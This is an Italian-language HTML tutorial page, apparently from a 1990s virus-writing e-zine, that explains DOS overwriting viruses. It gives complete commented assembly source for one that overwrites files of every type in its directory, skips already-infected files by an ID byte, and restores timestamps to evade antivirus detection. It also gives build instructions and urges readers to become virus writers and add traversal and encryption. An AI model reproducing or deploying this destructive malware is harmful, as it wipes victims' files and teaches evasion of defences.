<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<META NAME="Generator" CONTENT="DA RENEGADE FUCKIN' HTML CREATOR">
<TITLE>over</TITLE>
<META NAME="Version" CONTENT="8.0.3429">
<META NAME="Date" CONTENT="11/19/96">
<META NAME="Template" CONTENT="D:\Office 99 Pro\Office\HTML.DOT">
</HEAD>
<BODY TEXT="#000000" VLINK="#800080" BGCOLOR="#000000">

<B><U><FONT SIZE=6 COLOR="#ffff00"><P ALIGN="CENTER">L'overwriting virus</P>
</B></U></FONT><P ALIGN="CENTER"><IMG SRC="fireline.ren" WIDTH=571 HEIGHT=40></P>
<B><FONT FACE="Arial" COLOR="#00ff00"><P ALIGN="CENTER">Attenzione! Il codice virale riportato su questa pagina ha come unico scopo la distruzione dei vostri files.L'autore, cio&egrave; io ;) , non si assume alcuna responsabilit&agrave; per danni derivanti da esso o per alcun malfunzionamento a causa di questo virus.</P>
<P>&nbsp;</P>
</B></FONT><FONT FACE="Arial" COLOR="#ffff00"><P>Gli overwriting virus sono i virus pi&ugrave; semplici, non &egrave; un capolavoro programmarne uno.Un overwriting virus non viene considerato un virus vero e proprio nel mondo del VX, sia per la sua semplicit&agrave; di poter essere individuato molto facilmente, sia per la sua azione distruttiva che ha sui files.Spesso incontrerete overwriting virus che infettano solamente files con l'estensione .com.Ritengo che sia una grande cazzata, visto che se dobbiamo per forza distruggere i files mannamoli in culo tutti,no ? Tanto il virus sar&agrave; scoperto sempre pi&ugrave; o meno subito.E poi cambiando il tipo di file da *.com in *.* evitere anche che qualche Anti-Virus possa dare allarme a causa proprio di questo, che il virus cerca com files.Se volete intraprendere la via di un virus-writers posso solo sperare che non vi fermate al livello dell'overwriting virus.L'unica cosa decente &egrave; per iniziare ad imparare, tutto qua.Iniziate con l'overwriting virus, programmatene qualcuno e poi passate al com appending, exe e cos&igrave; via.Inoltre non ha neanche alcun senso spendere del tempo per rendere un overwriting virus capabile di caricarsi in memoria.Ora, il principio dell'overwriting virus dovrebbe essere chiaro, &egrave; abbastanza facile da capire.Eseguendo il file infettato, il virus copia l'intero codice virale all'inizio del file da infettare, sovrascrivendo l'inizio originale del file.In questo modo il virus ha reso il file ancora eseguibile, ma giusto il codice virale sar&agrave; eseguito.Il resto del file &egrave; perduto.</P>
<P>Allora, quando starete l&igrave; a cercare di programmare un overwriting virus, tenete presente la struttura di base del virus.Cio&egrave;, prima trovare un file con la funzione <B>4eh</B>, poi aprire il file con la funzione <B>3dh</B>, infettarlo , chiudere il file (<B>3eh</B>) e ritornare al DOS.La routine per il tipo del file da infettare la potete scegliere come volete, *.com, *.exe o quello che vi pare.Un'altra cosa molto importante, che vi servir&agrave; anche pi&ugrave; avanti, &egrave; di inserire un byte d'identificazione.In questo modo dopo aver aperto un file, prima di infettarlo il virus controller&agrave; se questo byte &egrave; gi&agrave; esistente o meno.In caso positivo, chiuder&agrave; il file senza infettarlo e cercher&agrave; il prossimo file.In caso questo byte non esistesse, il virus lo infetter&agrave; e rilascer&agrave; il byte nel file.Tutto questo per evitare che il virus infetti se stesso, cosa che preferibilmente non dovrebbe succedere :).Una volta che avrete sistemato l'ID byte, forse vi accorgerete che il virus fallisce se volete che esso infetti files protetti in scrittura. Adesso dovrete scrivere una piccola routine in modo che prima di aprire il file il virus metta gli attributi a 0, cioe' levare la protezione in scrittura.Ora, quando il file verr&agrave; modificato cambia anche la data.Diversi Anti-Virus usano questo sistema per rivelare se un file &egrave; stato modificato o meno.Allora aggiungiamo anche una piccola routine che, dopo l'infezione, ripristini tutti gli attributi e anche la data.Il payload di un virus simile, a parte ovviamente la sua natura di distruggere, pu&ograve; essere per esempio la visualizzazione di un testo, oppure i files infetti possono contenere solamente un testo,in modo che il virus diffondi senza segnalare niente all'utente. Per&ograve; cos&igrave; non ci sar&agrave; alcun problema per un Anti-Virus di trovarlo grazie al testo contenuto in un file infetto.Ecco un semplice esempio: </P>
<P>&nbsp;</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>Questo virus infetta un file ad ogni esecuzione, che si trova nella stessa directory, infetta ogni tipo di file e ripristina data e ora.Quando un file infettato sar&agrave; eseguito, il virus visualizzer&agrave; il messaggio "Ren - Zine test virus, un semplice overwriting virus".</P>
<P>_______________________________________________________________</P>
<P> code segment</P>
<P>assume cs:code,ds:code </P>
<P>org 0100h    </FONT><FONT FACE="Arial" COLOR="#ffff00">; se ora chiedete ancora qualcosa sulle prime tre righe potete andarvene a ;casa :)</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>start:jmp trova </P>
<P>db "f"            </FONT><FONT FACE="Arial" COLOR="#ffff00">; ecco il byte d'identificazione</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>trova: mov ah,4eh  </FONT><FONT FACE="Arial" COLOR="#ffff00">; la funzione 4eh la conoscete, trovare il primo file</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>trova_file: xor cx,cx  </FONT><FONT FACE="Arial" COLOR="#ffff00">; azzere il registro cx</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>lea dx, tipo_file  </FONT><FONT FACE="Arial" COLOR="#ffff00">; carica in dx il tipo di file che stiamo cercando</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>int 21h </P>
<P>jc mex </P>
<P>apri_file: mov ax,3d00h  </FONT><FONT FACE="Arial" COLOR="#ffff00">; apre il file</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>mov dx,9eh </P>
<P>int 21h </P>
<P>xchg bx,ax   </FONT><FONT FACE="Arial" COLOR="#ffff00">;scambia i valori di bx e ax (salva il nome del file)</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>mov ax,5700h </FONT><FONT FACE="Arial" COLOR="#ffff00">;qui invece leggiamo la data e ora</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>int 21h </P>
<P>push dx </P>
<P>push cx   </FONT><FONT FACE="Arial" COLOR="#ffff00">; e salviamo i valori di essi</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>leggi_file: </P>
<P>mov ah,3fh  </FONT><FONT FACE="Arial" COLOR="#ffff00">; anche questa funzione la conoscete, legge dal file</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>mov cx,4  </FONT><FONT FACE="Arial" COLOR="#ffff00">; la quantit&agrave; di bytes da leggere</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>lea dx, buffer </FONT><FONT FACE="Arial" COLOR="#ffff00">; il valore caricato in dx</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>int 21h </P>
<P>confronta: cmp byte ptr[buffer + 3],"f"  </FONT><FONT FACE="Arial" COLOR="#ffff00">; qui confrontiamo l'ID byte, se il quarto byte ;corrisponde ad una "f"</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>jnz riapri</P>
<P>mov ah,4fh </P>
<P>jmp trova_file </P>
<P>riapri: mov ax,3d02h </P>
<P>mov dx,9eh </P>
<P>int 21h </P>
<P>xchg bx,ax   </FONT><FONT FACE="Arial" COLOR="#ffff00">; la stessa procedura di prima</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>infetta: </P>
<P>mov ah,40h</P>
<P>mov cx,offset endvx - offset start</P>
<P>lea dx,start</P>
<P>int 21h    </FONT><FONT FACE="Arial" COLOR="#ffff00">; ecco l'infezione vera e propria, cio&egrave; la quantit&agrave; di codice da scivere nel file con ;la funzione 40h</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>mov ax,5701h </P>
<P>pop cx </P>
<P>pop dx   </FONT><FONT FACE="Arial" COLOR="#ffff00">; qui ripristiniamo la data e l'ora</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>int 21h </P>
<P>chiudi: </P>
<P>mov ah,3eh</P>
<P>mex: mov ah,09h</P>
<P>mov dx, offset msg</P>
<P>int 21h      </FONT><FONT FACE="Arial" COLOR="#ffff00">; e infine chiudiamo il file</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>exit: int 20h </P>
<P>tipo_file db "*.*",0 </P>
<P>buffer db ?,?,?,?</P>
<P>msg db " Ren - Zine test virus, un semplice overwriting virus$,"</P>
<P>endvx label near</P>
<P>code ends</P>
<P>end start  </FONT><FONT FACE="Arial" COLOR="#ffff00">; la solita fine</P>
</FONT><FONT FACE="Arial" COLOR="#00ff00"><P>_____________________________________________________</P>
</FONT><FONT FACE="Arial" COLOR="#ffff00"><P>Copiatelo e compilatelo come lo volete voi, il comando da usare &egrave; Tlink "nomefile" /tdc.Io mi vorrei fermare qua, ci sono ancora un sacco di cose che potete aggiungere , anche nel codice di sopra c'e' da ottimizzare, tipo una semplice directory traversal function, in modo che il virus non sar&agrave; troppo limitato nella stessa directory, oppure un overwriting virus pu&ograve; essere anche cifrato, insomma ci sono una marea di cosa da fare.L'unica cosa che vi posso dire &egrave; che dovete provare voi stessi a cambiare il codice, cercare di trovare qualcosa di nuovo, provarlo ancora e ancora.Avrete bisogno anche di molta pazienza, per&ograve; solamente cos&igrave; s'impara. Se volete potete usare anche un VCK ed esaminare il codice da esso creato.Il vostro compito ora sarebbe di inserire nel codice di sopra una routine per ripristinare gli attributi.Non dovrebbe essere troppo difficile, pensate sempre al concetto di base. Prima di aprire il file salvate gli attributi e dopo la chiusura ripristinateli.Le funzioni delle quali avrete bisogno le trovate in ogni lista di interrupt, quindi niente di difficile.</P>
<P>Bene, direi che questo &egrave; tutto per quello che riguarda l'overwriting virus, di solito non si spende del tempo per farne uno, ma si lavora su altri progetti pi&ugrave; grandi e complessi, per&ograve; per imparare pu&ograve; essere abbastanza utile.</P>
<P>&nbsp;</P>
</FONT><P ALIGN="CENTER"><A HREF="index.ren#RITORNA"><B><U><FONT SIZE=5 COLOR="#00ffff">RITORNA</B></U></FONT></A></P></BODY>
</HTML>
